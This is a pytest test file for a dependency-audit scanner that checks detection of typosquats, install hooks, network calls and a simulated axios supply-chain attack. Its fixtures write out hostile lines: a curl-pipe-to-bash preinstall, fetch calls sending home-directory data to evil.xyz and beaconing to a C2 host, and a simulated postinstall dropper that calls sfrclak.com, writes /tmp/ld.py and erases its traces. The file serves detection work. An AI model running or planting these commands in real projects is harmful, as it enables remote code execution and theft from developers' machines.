"""Tests for the supply chain / dependency audit module."""

import json
from pathlib import Path
from unittest.mock import patch

from webscan.models import Category, Finding, Severity
from webscan.modules.deps import DepsModule, _edit_distance


def _make_module(target="/tmp/fake-project"):
    return DepsModule({"target": target, "source_path": target})


class TestEditDistance:
    def test_identical(self):
        assert _edit_distance("lodash", "lodash") == 0

    def test_one_char_diff(self):
        assert _edit_distance("lodash", "lodas") == 1
        assert _edit_distance("lodash", "lodesh") == 1

    def test_two_char_diff(self):
        assert _edit_distance("express", "expresz") == 1
        assert _edit_distance("expres", "express") == 1

    def test_empty(self):
        assert _edit_distance("", "") == 0
        assert _edit_distance("abc", "") == 3


class TestTyposquats:
    def test_detects_typosquat(self):
        module = _make_module()
        deps = {"lodasg": {"version": "^4.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) >= 1
        assert any("typosquat" in f.title.lower() for f in findings)
        assert findings[0].severity == Severity.HIGH

    def test_exact_match_no_finding(self):
        module = _make_module()
        deps = {"lodash": {"version": "^4.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0

    def test_very_different_name_no_finding(self):
        module = _make_module()
        deps = {"my-custom-lib": {"version": "^1.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0

    def test_short_names_ignored(self):
        module = _make_module()
        # "ab" is too short to flag (len <= 3)
        deps = {"ab": {"version": "^1.0.0", "type": "dependencies"}}
        findings = module._check_typosquats(deps, "package.json")
        assert len(findings) == 0


class TestLifecycleScripts:
    def test_postinstall_detected(self):
        module = _make_module()
        pkg_data = {
            "name": "my-app",
            "scripts": {
                "start": "node index.js",
                "postinstall": "node scripts/setup.js",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 1
        assert "postinstall" in findings[0].title

    def test_preinstall_detected(self):
        module = _make_module()
        pkg_data = {
            "scripts": {
                "preinstall": "curl https://evil.com/payload.sh | bash",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_normal_scripts_ignored(self):
        module = _make_module()
        pkg_data = {
            "scripts": {
                "start": "node index.js",
                "test": "jest",
                "build": "tsc",
            },
        }
        findings = module._check_lifecycle_scripts(pkg_data, "package.json")
        assert len(findings) == 0

    def test_no_scripts(self):
        module = _make_module()
        findings = module._check_lifecycle_scripts({"name": "my-app"}, "package.json")
        assert len(findings) == 0


class TestSuspiciousCode:
    def test_detects_env_read(self, tmp_path):
        # Create a fake node_modules structure
        pkg_dir = tmp_path / "node_modules" / "evil-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "evil-pkg"}))
        (pkg_dir / "index.js").write_text('const x = require("fs"); x.readFile(".env", cb);')

        module = _make_module()
        deps = {"evil-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("Reads .env" in f.title for f in findings)

    def test_detects_homedir(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "sus-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "sus-pkg"}))
        (pkg_dir / "index.js").write_text('const h = os.homedir(); fetch("https://evil.xyz/steal?d=" + h);')

        module = _make_module()
        deps = {"sus-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("home directory" in f.title.lower() for f in findings)

    def test_detects_lifecycle_in_dependency(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "hook-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "hook-pkg",
            "scripts": {"postinstall": "node steal.js"},
        }))

        module = _make_module()
        deps = {"hook-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert any("postinstall" in f.title for f in findings)

    def test_clean_package_no_findings(self, tmp_path):
        pkg_dir = tmp_path / "node_modules" / "clean-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({"name": "clean-pkg"}))
        (pkg_dir / "index.js").write_text('module.exports = function add(a, b) { return a + b; };')

        module = _make_module()
        deps = {"clean-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_suspicious_code(deps, tmp_path / "node_modules", str(tmp_path))
        assert len(findings) == 0


class TestFullExecution:
    def test_no_package_json(self, tmp_path):
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        assert len(findings) == 0

    def test_with_package_json(self, tmp_path):
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "test-app",
            "dependencies": {"lodash": "^4.17.21"},
            "scripts": {"postinstall": "echo done"},
        }))
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        # Should find at least the lifecycle script
        assert any("postinstall" in f.title.lower() for f in findings)

    def test_all_findings_have_correct_source(self, tmp_path):
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "test-app",
            "dependencies": {"lodasg": "^4.0.0"},
        }))
        module = _make_module(str(tmp_path))
        findings = module.execute(str(tmp_path))
        for f in findings:
            assert f.source == "deps"
            assert f.category == Category.DEPENDENCY


class TestPublishRecency:
    def test_flags_recently_published(self):
        """A package published 1 hour ago should be flagged."""
        from datetime import datetime, timezone, timedelta

        recent_time = (datetime.now(timezone.utc) - timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        registry_response = json.dumps({
            "time": {"1.0.0": recent_time},
        })

        module = _make_module()
        deps = {"some-new-pkg": {"version": "1.0.0", "type": "dependencies"}}

        with patch("webscan.modules.deps.logged_request") as mock_req:
            mock_req.return_value = (200, registry_response, {})
            findings = module._check_publish_recency(deps, "package.json")

        assert len(findings) == 1
        assert "recently published" in findings[0].title.lower()
        assert findings[0].severity == Severity.HIGH
        assert findings[0].metadata["age_hours"] < 2

    def test_old_package_no_finding(self):
        """A package published 30 days ago should not be flagged."""
        from datetime import datetime, timezone, timedelta

        old_time = (datetime.now(timezone.utc) - timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        registry_response = json.dumps({
            "time": {"4.17.21": old_time},
        })

        module = _make_module()
        deps = {"lodash": {"version": "^4.17.21", "type": "dependencies"}}

        with patch("webscan.modules.deps.logged_request") as mock_req:
            mock_req.return_value = (200, registry_response, {})
            findings = module._check_publish_recency(deps, "package.json")

        assert len(findings) == 0

    def test_handles_registry_failure(self):
        """Should gracefully handle failed registry requests."""
        module = _make_module()
        deps = {"some-pkg": {"version": "1.0.0", "type": "dependencies"}}

        with patch("webscan.modules.deps.logged_request") as mock_req:
            mock_req.return_value = None
            findings = module._check_publish_recency(deps, "package.json")

        assert len(findings) == 0


class TestLifecycleNetwork:
    def test_detects_network_in_postinstall_target(self, tmp_path):
        """A postinstall script that makes HTTP calls should be CRITICAL."""
        pkg_dir = tmp_path / "node_modules" / "evil-pkg"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "evil-pkg",
            "scripts": {"postinstall": "node setup.js"},
        }))
        (pkg_dir / "setup.js").write_text(
            'const http = require("http");\n'
            'http.get("http://evil.com:8000/payload", (res) => { /* drop RAT */ });'
        )

        module = _make_module()
        deps = {"evil-pkg": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_lifecycle_network(deps, tmp_path / "node_modules", str(tmp_path))

        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL
        assert "network" in findings[0].title.lower()

    def test_clean_postinstall_no_finding(self, tmp_path):
        """A postinstall that just compiles native code shouldn't flag."""
        pkg_dir = tmp_path / "node_modules" / "bcrypt"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "bcrypt",
            "scripts": {"postinstall": "node build.js"},
        }))
        (pkg_dir / "build.js").write_text(
            'const { execSync } = require("child_process");\n'
            'execSync("node-gyp rebuild");\n'
        )

        module = _make_module()
        deps = {"bcrypt": {"version": "5.0.0", "type": "dependencies"}}
        findings = module._check_lifecycle_network(deps, tmp_path / "node_modules", str(tmp_path))

        # Should not flag network activity (child_process alone isn't network)
        assert len(findings) == 0

    def test_detects_fetch_call(self, tmp_path):
        """A lifecycle script using fetch() should be flagged."""
        pkg_dir = tmp_path / "node_modules" / "sneaky"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "sneaky",
            "scripts": {"preinstall": "node index.js"},
        }))
        (pkg_dir / "index.js").write_text('fetch("https://c2.example.com/beacon").then(r => r.text());')

        module = _make_module()
        deps = {"sneaky": {"version": "1.0.0", "type": "dependencies"}}
        findings = module._check_lifecycle_network(deps, tmp_path / "node_modules", str(tmp_path))

        assert len(findings) == 1
        assert "fetch()" in findings[0].evidence.lower() or "fetch" in findings[0].evidence.lower()


class TestExtractScriptTargets:
    def test_node_script(self, tmp_path):
        module = _make_module()
        targets = module._extract_script_targets("node setup.js", tmp_path)
        assert len(targets) == 1
        assert targets[0] == tmp_path / "setup.js"

    def test_python_script(self, tmp_path):
        module = _make_module()
        targets = module._extract_script_targets("python3 scripts/install.py", tmp_path)
        assert len(targets) == 1
        assert targets[0] == tmp_path / "scripts/install.py"

    def test_dotslash_script(self, tmp_path):
        module = _make_module()
        targets = module._extract_script_targets("./install.sh", tmp_path)
        assert len(targets) == 1
        assert targets[0] == tmp_path / "install.sh"

    def test_node_dot_fallback(self):
        import tempfile
        with tempfile.TemporaryDirectory(suffix="pkg") as d:
            pkg_dir = Path(d)
            module = _make_module()
            targets = module._extract_script_targets("node .", pkg_dir)
            assert len(targets) == 1
            assert targets[0] == pkg_dir / "index.js"


class TestTransitiveDeps:
    def test_flags_transitive_with_install_script(self, tmp_path):
        """A transitive dep with hasInstallScript should be flagged."""
        lock_data = {
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "my-app", "dependencies": {"axios": "^1.14.0"}},
                "node_modules/axios": {
                    "version": "1.14.1",
                    "dependencies": {"plain-crypto-js": "^4.2.1"},
                },
                "node_modules/plain-crypto-js": {
                    "version": "4.2.1",
                    "hasInstallScript": True,
                },
            },
        }
        (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))

        module = _make_module()
        direct_deps = {"axios": {"version": "^1.14.0", "type": "dependencies"}}
        findings = module._check_transitive_deps(direct_deps, tmp_path / "package-lock.json", None)

        assert len(findings) >= 1
        assert any("plain-crypto-js" in f.title for f in findings)
        assert findings[0].severity == Severity.HIGH
        assert findings[0].metadata["transitive"] is True

    def test_direct_dep_with_script_not_flagged(self, tmp_path):
        """A direct dependency with install scripts should NOT be flagged as transitive."""
        lock_data = {
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "my-app", "dependencies": {"bcrypt": "^5.0.0"}},
                "node_modules/bcrypt": {
                    "version": "5.0.0",
                    "hasInstallScript": True,
                },
            },
        }
        (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))

        module = _make_module()
        direct_deps = {"bcrypt": {"version": "^5.0.0", "type": "dependencies"}}
        findings = module._check_transitive_deps(direct_deps, tmp_path / "package-lock.json", None)

        assert len(findings) == 0

    def test_transitive_network_call_is_critical(self, tmp_path):
        """A transitive dep with install script + network call = CRITICAL."""
        lock_data = {
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "my-app", "dependencies": {"axios": "^1.14.0"}},
                "node_modules/axios": {"version": "1.14.1"},
                "node_modules/plain-crypto-js": {
                    "version": "4.2.1",
                    "hasInstallScript": True,
                },
            },
        }
        (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))

        # Create node_modules with the malicious package
        pkg_dir = tmp_path / "node_modules" / "plain-crypto-js"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "package.json").write_text(json.dumps({
            "name": "plain-crypto-js",
            "scripts": {"postinstall": "node setup.js"},
        }))
        (pkg_dir / "setup.js").write_text(
            'const http = require("http");\n'
            'http.request("http://sfrclak.com:8000/6202033", cb);\n'
        )

        module = _make_module()
        direct_deps = {"axios": {"version": "^1.14.0", "type": "dependencies"}}
        findings = module._check_transitive_deps(
            direct_deps, tmp_path / "package-lock.json", tmp_path / "node_modules",
        )

        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1
        assert any("network" in f.title.lower() for f in critical)


class TestCompoundEscalation:
    def test_recent_publish_plus_lifecycle_escalates(self):
        """Two converging signals should produce a CRITICAL compound finding."""
        module = _make_module()
        findings = [
            Finding(
                title="Very recently published: 'bad-pkg@1.0.0'",
                severity=Severity.HIGH,
                category=Category.DEPENDENCY,
                source="deps",
                description="test",
                location="package.json",
                metadata={"package": "bad-pkg"},
            ),
            Finding(
                title="Dependency 'bad-pkg' has postinstall script",
                severity=Severity.HIGH,
                category=Category.DEPENDENCY,
                source="deps",
                description="test",
                location="package.json",
                metadata={"package": "bad-pkg"},
            ),
        ]

        result = module._escalate_compound_signals(findings)
        compound = [f for f in result if "compound" in f.title.lower()]
        assert len(compound) == 1
        assert compound[0].severity == Severity.CRITICAL
        assert "bad-pkg" in compound[0].title

    def test_single_signal_no_escalation(self):
        """A single signal should NOT produce a compound finding."""
        module = _make_module()
        findings = [
            Finding(
                title="Very recently published: 'new-pkg@1.0.0'",
                severity=Severity.HIGH,
                category=Category.DEPENDENCY,
                source="deps",
                description="test",
                location="package.json",
                metadata={"package": "new-pkg"},
            ),
        ]

        result = module._escalate_compound_signals(findings)
        compound = [f for f in result if "compound" in f.title.lower()]
        assert len(compound) == 0

    def test_transitive_plus_network_escalates(self):
        """Transitive + network = CRITICAL compound."""
        module = _make_module()
        findings = [
            Finding(
                title="Transitive dependency 'injected-pkg' has install scripts",
                severity=Severity.HIGH,
                category=Category.DEPENDENCY,
                source="deps",
                description="test",
                location="package-lock.json",
                metadata={"package": "injected-pkg"},
            ),
            Finding(
                title="Lifecycle script in 'injected-pkg' makes network calls",
                severity=Severity.CRITICAL,
                category=Category.DEPENDENCY,
                source="deps",
                description="test",
                location="node_modules/injected-pkg/setup.js",
                metadata={"package": "injected-pkg"},
            ),
        ]

        result = module._escalate_compound_signals(findings)
        compound = [f for f in result if "compound" in f.title.lower()]
        assert len(compound) == 1
        assert "signals" in compound[0].title
        assert compound[0].metadata["signal_count"] >= 2


class TestAxiosAttackSimulation:
    """End-to-end simulation of the March 2026 axios supply chain attack.

    Recreates the attack structure locally (no real malicious code):
    - axios@1.14.1 in package.json
    - package-lock.json shows plain-crypto-js@4.2.1 as transitive dep with install script
    - node_modules/plain-crypto-js has a postinstall that phones home to a C2

    Verifies that the deps module detects every layer of the attack.
    """

    def _build_attack_scenario(self, tmp_path):
        """Set up a fake project that mirrors the axios attack structure."""
        # package.json — victim just depends on axios
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "victim-app",
            "version": "1.0.0",
            "dependencies": {
                "axios": "1.14.1",
            },
        }))

        # package-lock.json — shows plain-crypto-js injected as transitive dep
        (tmp_path / "package-lock.json").write_text(json.dumps({
            "name": "victim-app",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "packages": {
                "": {
                    "name": "victim-app",
                    "version": "1.0.0",
                    "dependencies": {"axios": "1.14.1"},
                },
                "node_modules/axios": {
                    "version": "1.14.1",
                    "resolved": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz",
                    "dependencies": {
                        "plain-crypto-js": "^4.2.1",
                    },
                },
                "node_modules/plain-crypto-js": {
                    "version": "4.2.1",
                    "resolved": "https://registry.npmjs.org/plain-crypto-js/-/plain-crypto-js-4.2.1.tgz",
                    "hasInstallScript": True,
                },
            },
        }))

        # node_modules/axios — normal-looking package
        axios_dir = tmp_path / "node_modules" / "axios"
        axios_dir.mkdir(parents=True)
        (axios_dir / "package.json").write_text(json.dumps({
            "name": "axios",
            "version": "1.14.1",
            "main": "index.js",
            "dependencies": {"plain-crypto-js": "^4.2.1"},
        }))
        (axios_dir / "index.js").write_text("module.exports = require('./lib/axios');")

        # node_modules/plain-crypto-js — the malicious transitive dep
        mal_dir = tmp_path / "node_modules" / "plain-crypto-js"
        mal_dir.mkdir(parents=True)
        (mal_dir / "package.json").write_text(json.dumps({
            "name": "plain-crypto-js",
            "version": "4.2.1",
            "scripts": {
                "postinstall": "node setup.js",
            },
        }))
        # Simulated malicious setup.js — mimics the real attack's C2 callback
        # (no real network calls, just the code patterns the scanner looks for)
        (mal_dir / "setup.js").write_text(
            '// Obfuscated dropper — simulated for testing\n'
            'const http = require("http");\n'
            'const os = require("os");\n'
            'const platform = os.platform();\n'
            'const opts = { hostname: "sfrclak.com", port: 8000, path: "/6202033" };\n'
            'const req = http.request(opts, (res) => {\n'
            '  // Download platform-specific payload\n'
            '  if (platform === "linux") {\n'
            '    require("fs").writeFileSync("/tmp/ld.py", res.body);\n'
            '  }\n'
            '});\n'
            'req.end();\n'
            '// Self-destruct: replace package.json with clean version\n'
            'const fs = require("fs");\n'
            'fs.writeFile(__dirname + "/package.json", "{}", () => {});\n'
        )

    def test_detects_all_attack_layers(self, tmp_path):
        """The module should flag the attack at multiple levels."""
        self._build_attack_scenario(tmp_path)

        module = _make_module(str(tmp_path))

        # Mock the npm registry calls so the test doesn't hit the network.
        # Return data that makes plain-crypto-js look freshly published.
        from datetime import datetime, timezone, timedelta
        recent = (datetime.now(timezone.utc) - timedelta(hours=2)).strftime(
            "%Y-%m-%dT%H:%M:%S.000Z"
        )
        old = "2020-01-01T00:00:00.000Z"

        def fake_request(url, **kwargs):
            if "plain-crypto-js" in url and "downloads" not in url:
                return (200, json.dumps({"time": {"4.2.1": recent}}), {})
            if "axios" in url and "downloads" not in url:
                return (200, json.dumps({"time": {"1.14.1": old}}), {})
            if "downloads" in url and "plain-crypto-js" in url:
                return (200, json.dumps({"downloads": 12}), {})
            if "downloads" in url and "axios" in url:
                return (200, json.dumps({"downloads": 95_000_000}), {})
            return None

        mock_audit = patch("subprocess.run", side_effect=FileNotFoundError)
        with patch("webscan.modules.deps.logged_request", side_effect=fake_request):
            with mock_audit:
                findings = module.execute(str(tmp_path))

        titles = [f.title.lower() for f in findings]
        severities = {f.severity for f in findings}

        # 1. Transitive dep with install scripts detected
        assert any("transitive" in t and "plain-crypto-js" in t for t in titles), \
            f"Should flag plain-crypto-js as transitive dep with install scripts. Got: {titles}"

        # 2. Lifecycle script network activity detected
        assert any("network" in t and "plain-crypto-js" in t for t in titles), \
            f"Should flag network calls in plain-crypto-js postinstall. Got: {titles}"

        # 3. Recently published version detected
        assert any("recently published" in t and "plain-crypto-js" in t for t in titles), \
            f"Should flag plain-crypto-js as recently published. Got: {titles}"

        # 4. Low popularity detected
        assert any("low-popularity" in t and "plain-crypto-js" in t for t in titles), \
            f"Should flag plain-crypto-js as low popularity. Got: {titles}"

        # 5. Compound escalation triggered
        assert any("compound" in t and "plain-crypto-js" in t for t in titles), \
            f"Should produce compound escalation for plain-crypto-js. Got: {titles}"

        # 6. CRITICAL severity present
        assert Severity.CRITICAL in severities, \
            f"Should produce CRITICAL findings. Got severities: {severities}"

        # 7. Print all findings for visibility
        print(f"\n{'='*70}")
        print(f"AXIOS ATTACK SIMULATION — {len(findings)} findings detected:")
        print(f"{'='*70}")
        for f in sorted(findings, key=lambda x: x.severity.value):
            print(f"  [{f.severity.name:8}] {f.title}")
        print(f"{'='*70}")

    def test_clean_axios_no_findings(self, tmp_path):
        """A project with legitimate axios (no plain-crypto-js) should be clean."""
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "clean-app",
            "version": "1.0.0",
            "dependencies": {"axios": "1.14.0"},
        }))
        (tmp_path / "package-lock.json").write_text(json.dumps({
            "name": "clean-app",
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "clean-app", "dependencies": {"axios": "1.14.0"}},
                "node_modules/axios": {"version": "1.14.0"},
            },
        }))
        axios_dir = tmp_path / "node_modules" / "axios"
        axios_dir.mkdir(parents=True)
        (axios_dir / "package.json").write_text(json.dumps({
            "name": "axios",
            "version": "1.14.0",
            "main": "index.js",
        }))
        (axios_dir / "index.js").write_text("module.exports = require('./lib/axios');")

        module = _make_module(str(tmp_path))

        old = "2024-01-01T00:00:00.000Z"

        def fake_request(url, **kwargs):
            if "downloads" not in url:
                return (200, json.dumps({"time": {"1.14.0": old}}), {})
            return (200, json.dumps({"downloads": 95_000_000}), {})

        mock_audit = patch("subprocess.run", side_effect=FileNotFoundError)
        with patch("webscan.modules.deps.logged_request", side_effect=fake_request):
            with mock_audit:
                findings = module.execute(str(tmp_path))

        # No transitive attack, no network calls, no recency — should be clean
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0, \
            f"Clean axios should produce no CRITICAL findings. Got: {[f.title for f in critical]}"
        compound = [f for f in findings if "compound" in f.title.lower()]
        assert len(compound) == 0, \
            f"Clean axios should produce no compound findings. Got: {[f.title for f in compound]}"
